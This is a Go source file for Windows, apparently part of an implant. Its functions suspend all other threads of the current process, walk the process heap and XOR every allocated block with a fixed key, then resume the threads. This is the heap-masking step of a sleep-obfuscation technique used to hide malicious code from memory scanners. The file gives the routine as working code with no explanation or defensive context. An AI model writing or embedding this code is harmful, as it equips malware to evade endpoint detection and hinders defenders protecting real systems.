//go:build windows
package packet

import (
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)


type PROCESS_HEAP_ENTRY struct {
	LpData       unsafe.Pointer
	CbData       uint32
	CbOverhead   byte
	IRegionIndex byte
	WFlags       uint16
	PROCESS_HEAP_ENTRY_Anonymous
}

type PROCESS_HEAP_ENTRY_Anonymous struct {
	Data [3]uint64
}


func EncryptHeap() {
	var heapEntry PROCESS_HEAP_ENTRY
	var PROCESS_HEAP_ENTRY_BUSY = 4
	//hHeap, _, _ := syscall.SyscallN(GetProcessHeap)
	hHeap, _, _ := GetProcessHeap.Call()
	test := false
	windows.SleepEx(3,test)
	/*if err != nil && err.Error() != "The operation completed successfully."{
		fmt.Println("GetProcessHeap: "+err.Error())
		//return
	}*/

	/*_, _, _ = syscall.SyscallN(HeapLock,hHeap)
	//_, _, _ = HeapLock.Call(hHeap)
	windows.SleepEx(2,test)*/

	//heapWalk, _, _ := syscall.SyscallN(HeapWalk,hHeap, uintptr(unsafe.Pointer(&heapEntry)))
	heapWalk, _, _ := HeapWalk.Call(hHeap, uintptr(unsafe.Pointer(&heapEntry)))
	windows.SleepEx(3,test)
	/*if err != nil && err.Error() != "The operation completed successfully."{
		fmt.Println("HeapWalk: "+err.Error())
		//return
	}*/
	var temp int
	for heapWalk>0 {
		temp++
		if (int(heapEntry.WFlags) & PROCESS_HEAP_ENTRY_BUSY) != 0 {
			dw := *(*[]byte)(unsafe.Pointer(&heapEntry.LpData))
			for i :=0; i < int(heapEntry.CbData); i++{
				dw[i] = dw[i] ^ 7
			}
		}
		//heapWalk, _, _ = syscall.SyscallN(HeapWalk,hHeap, uintptr(unsafe.Pointer(&heapEntry)))
		heapWalk, _, _ = HeapWalk.Call(hHeap, uintptr(unsafe.Pointer(&heapEntry)))
		windows.SleepEx(3,test)
		/*if err != nil && err.Error() != "The operation completed successfully."{
			fmt.Println("HeapWalk: "+err.Error())
			//return
		}*/
		//fmt.Println(temp)
	}

	//windows.SleepEx(2,test)
	/*_, _, _ = syscall.SyscallN(HeapUnlock,hHeap)
	windows.SleepEx(2,test)*/

}


func DoSuspendThreads() {
	//var modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	//var SuspendThread = modkernel32.NewProc("SuspendThread")
	targetProcessId := windows.GetCurrentProcessId()
	targetThreadId := windows.GetCurrentThreadId()
	hThread, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if hThread != windows.InvalidHandle {
		var threadEntry windows.ThreadEntry32
		threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
		err := windows.Thread32First(hThread, &threadEntry)
		for err == nil {
			//if threadEntry.Size >= threadEntry.OwnerProcessID+uint32(unsafe.Sizeof(threadEntry.OwnerProcessID)) {
				//fmt.Println(threadEntry)
				if threadEntry.ThreadID != targetThreadId && threadEntry.OwnerProcessID == targetProcessId {
					//fmt.Println(threadEntry.ThreadID)
					thread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, threadEntry.ThreadID)
					if err != nil {
						fmt.Println(err)
						return
					}
					if thread != 0 {
						_, _, err := SuspendThread.Call(uintptr(thread))
						if err != nil && err.Error() != "The operation completed successfully."{
							fmt.Println(err)
							return
						}
						err = windows.CloseHandle(thread)
						if err != nil {
							fmt.Println(err)
							return
						}
					}
				}
			//}
			threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
			err = windows.Thread32Next(hThread, &threadEntry)
		}
		//err = windows.Thread32Next(hThread, &threadEntry)
	}
}

func DoResumeThreads() {
	//var modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	//var ResumeThread = modkernel32.NewProc("ResumeThread")
	targetProcessId := windows.GetCurrentProcessId()
	//fmt.Println(targetProcessId)
	targetThreadId := windows.GetCurrentThreadId()
	//fmt.Println(targetThreadId)
	hThread, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if hThread != windows.InvalidHandle {
		var threadEntry windows.ThreadEntry32
		threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
		err := windows.Thread32First(hThread, &threadEntry)
		//fmt.Println(threadEntry)
		for err == nil {
			//if threadEntry.Size >= threadEntry.OwnerProcessID+uint32(unsafe.Sizeof(threadEntry.OwnerProcessID)) {
				if threadEntry.ThreadID != targetThreadId && threadEntry.OwnerProcessID == targetProcessId {
					thread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, threadEntry.ThreadID)
					if err != nil {
						fmt.Println(err)
						return
					}
					if thread != 0 {
						result, _, err := ResumeThread.Call(uintptr(thread))
						test := false
						windows.SleepEx(5,test)
						//fmt.Println(result)
						/*if err != nil && err.Error() != "The operation completed successfully."{
							fmt.Println(err)
							return
						}*/
						err = windows.CloseHandle(thread)
						if err != nil {
							fmt.Println(err)
							return
						}
						fmt.Println(result)
					}
				}
			//}
			threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
			err = windows.Thread32Next(hThread, &threadEntry)
			//fmt.Println(threadEntry)
		}
		//err = windows.Thread32Next(hThread, &threadEntry)
	}
}